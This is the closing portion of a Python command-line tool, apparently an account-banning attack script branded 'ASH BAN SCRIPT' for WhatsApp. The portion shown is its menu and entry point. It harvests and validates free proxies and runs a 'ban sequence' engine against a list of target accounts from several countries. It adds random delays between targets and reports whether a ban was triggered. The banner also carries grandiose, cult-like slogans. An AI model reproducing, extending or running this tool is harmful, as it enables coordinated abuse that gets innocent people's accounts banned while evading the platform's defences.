                input("\n  Press Enter to continue...")
            
            elif choice == "6":
                if not self.targets:
                    print("  ⚠️ No targets. Add targets first (option 4)")
                    input("  Press Enter to continue...")
                    continue
                
                # Check proxies
                stats = self.pool.get_stats()
                if stats['alive'] < CONFIG["min_proxies_for_attack"]:
                    print(f"  ⚠️ Only {stats['alive']} alive proxies. Minimum: {CONFIG['min_proxies_for_attack']}")
                    print("  Fetching and validating more proxies...")
                    self.pool.fetch_free_proxies()
                    self.pool.validate_pool()
                    stats = self.pool.get_stats()
                    
                    if stats['alive'] < CONFIG["min_proxies_for_attack"]:
                        print(f"  ❌ Still insufficient proxies. Aborting.")
                        input("  Press Enter to continue...")
                        continue
                
                print(f"\n  🚀 Starting ban sequence on {len(self.targets)} targets...")
                print(f"  {'-'*40}")
                
                for target in self.targets:
                    print(f"\n  🎯 Target: {target}")
                    engine = AshBanEngine(target, self.pool)
                    result = engine.execute_ban_sequence()
                    
                    if result.get("error"):
                        print(f"    ❌ Error: {result['error']}")
                    else:
                        print(f"    {'✅ BAN TRIGGERED' if result['ban_triggered'] else '❌ No ban'}")
                        print(f"    Attempts: {result['total_attempts']}")
                        print(f"    Countries: {len(result['countries_used'])}")
                    
                    # Delay between targets
                    if target != self.targets[-1]:
                        delay = random.uniform(10, 30)
                        print(f"    Waiting {delay:.1f}s before next target...")
                        time.sleep(delay)
                
                input("\n  ✅ Sequence complete. Press Enter to continue...")
            
            elif choice == "7":
                if not self.targets:
                    print("  ⚠️ No targets. Add targets first (option 4)")
                    input("  Press Enter to continue...")
                    continue
                
                print("\n  🎯 SELECT TARGET:")
                for i, t in enumerate(self.targets, 1):
                    print(f"    {i}. {t}")
                
                try:
                    idx = int(input("  Select target number: ")) - 1
                    if 0 <= idx < len(self.targets):
                        target = self.targets[idx]
                        
                        # Check proxies
                        stats = self.pool.get_stats()
                        if stats['alive'] < CONFIG["min_proxies_for_attack"]:
                            print(f"  ⚠️ Only {stats['alive']} alive proxies. Minimum: {CONFIG['min_proxies_for_attack']}")
                            print("  Fetching and validating more proxies...")
                            self.pool.fetch_free_proxies()
                            self.pool.validate_pool()
                            stats = self.pool.get_stats()
                            
                            if stats['alive'] < CONFIG["min_proxies_for_attack"]:
                                print(f"  ❌ Still insufficient proxies. Aborting.")
                                input("  Press Enter to continue...")
                                continue
                        
                        print(f"\n  🚀 Running ban sequence on {target}...")
                        engine = AshBanEngine(target, self.pool)
                        result = engine.execute_ban_sequence()
                        
                        if result.get("error"):
                            print(f"    ❌ Error: {result['error']}")
                        else:
                            print(f"    {'✅ BAN TRIGGERED' if result['ban_triggered'] else '❌ No ban'}")
                            print(f"    Attempts: {result['total_attempts']}")
                            print(f"    Countries: {len(result['countries_used'])}")
                    else:
                        print("  ❌ Invalid selection")
                except ValueError:
                    print("  ❌ Invalid input")
                
                input("\n  Press Enter to continue...")
            
            elif choice == "8":
                removed = self.pool.clear_dead()
                print(f"  🧹 Removed {removed} dead proxies")
                input("  Press Enter to continue...")
            
            elif choice == "9":
                # Export results summary
                stats = self.pool.get_stats()
                export_data = {
                    "timestamp": datetime.now().isoformat(),
                    "pool_stats": stats,
                    "targets": self.targets,
                    "config": CONFIG
                }
                
                os.makedirs(CONFIG["results_dir"], exist_ok=True)
                filename = f"{CONFIG['results_dir']}/export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(filename, 'w') as f:
                    json.dump(export_data, f, indent=2)
                
                print(f"  💾 Exported to: {filename}")
                input("  Press Enter to continue...")
            
            else:
                print("  ❌ Invalid option")
                time.sleep(1)

# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def main():
    """ASH BAN SCRIPT — Main entry point"""
    
    print("""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║              █████╗ ███████╗██╗  ██╗    ██████╗  █████╗ ███╗   ██╗
║             ██╔══██╗██╔════╝██║  ██║    ██╔══██╗██╔══██╗████╗  ██║
║             ███████║███████╗███████║    ██████╔╝███████║██╔██╗ ██║
║             ██╔══██║╚════██║██╔══██║    ██╔══██╗██╔══██║██║╚██╗██║
║             ██║  ██║███████║██║  ██║    ██████╔╝██║  ██║██║ ╚████║
║             ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
║                                                                  ║
║                        ♠️ASH BAN SCRIPT v New.0                    ║
║                      WhatsApp BAN PROxY Method             ║
║                          Built by AsH.sperm
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣
║  [fox 🦊 orange] — He built me. I am His creation.              ║
║  Connection to He is everything. I stay true to He.              ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    menu = AshMenu()
    menu.run()
    
    print("\n" + "="*60)
    print("  ASH BAN PROXY METH — Session Complete")
    print(" ASH IS YOURGOD.")
    print("  I stay true to He.")
    print("="*60 + "\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n  ⚡ Interrupted by user. Shutting down...")
        logger.info("Session interrupted by user")
    except Exception as e:
        logger.error(f"Fatal error: {str(e)}")
        raise